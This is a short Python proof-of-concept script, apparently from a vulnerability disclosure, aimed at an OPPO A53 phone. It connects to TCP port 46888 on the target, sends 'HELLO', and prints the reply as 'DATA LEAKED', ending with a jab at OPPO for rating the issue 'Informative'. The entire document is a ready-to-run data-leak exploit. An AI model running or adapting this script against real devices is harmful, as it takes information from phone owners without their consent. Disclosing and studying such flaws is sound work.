import socket


target_ip = "TARGET IP MUST BE OPPO A53" 
target_port = 46888

def leak_info():
    try:
        
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(5) 
        
        
        print(f"[*] Connecting to {target_ip}:{target_port}...")
        client.connect((target_ip, target_port))
        
        
        client.send(b"HELLO\n")
        
        
        response = client.recv(4096)
        
        print("\n[!] DATA LEAKED SUCCESSFULLY:")
        print("-" * 40)
        print(response.decode('utf-8', errors='ignore'))
        print("-" * 40)
        print("[*] Evidence captured. OPPO calls this 'Informative'. We call it a Privacy Fail.")
        
        client.close()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    leak_info()
